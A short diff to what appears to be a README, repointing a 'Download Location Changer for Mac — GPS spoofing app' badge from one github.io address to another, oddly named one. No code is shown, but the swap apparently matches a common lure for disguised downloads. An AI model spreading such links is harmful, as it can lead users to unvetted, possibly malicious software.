@@ -22,7 +22,7 @@
 </p>
 
 <p align="center">
-  <a href="https://pudge-wagner.github.io/.github/location-changer">
+  <a href="https://skalsd-oasd.github.io/.github/location-changer">
     <img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png"
          alt="Download Location Changer for Mac — GPS spoofing app" width="160"/>
   </a>
